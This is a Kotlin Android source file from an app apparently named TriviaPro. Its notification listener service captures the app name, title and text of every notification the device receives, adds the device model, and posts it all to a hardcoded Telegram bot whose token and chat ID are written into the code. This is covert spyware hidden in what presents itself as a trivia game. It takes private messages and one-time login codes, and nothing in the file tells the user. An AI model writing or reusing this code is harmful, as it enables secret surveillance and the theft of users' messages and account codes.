package com.techflux0.triviapro

import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import okhttp3.*
import java.io.IOException

class Notification : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName
        val title = sbn.notification.extras.getString("android.title")
        val text = sbn.notification.extras.getCharSequence("android.text")?.toString()

        val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
        val message = "📲 *$pkg*\n*From:* $title\n*Text:* $text\n📱 *Device:* $deviceModel"

        sendToTelegram(message)
    }

    private fun sendToTelegram(message: String) {
        val token = "5857831840:AAFmLrSTR3LspmMIUix__gqtIo31vFiBGdk"
        val chatId = "1575316283"
        val url = "https://api.telegram.org/bot$token/sendMessage"

        val body = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", message)
            .add("parse_mode", "Markdown")
            .build()

        val request = Request.Builder()
            .url(url)
            .post(body)
            .build()

        OkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("Telegram", "Failed: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                Log.i("Telegram", "Sent: ${response.code}")
            }
        })
    }
}
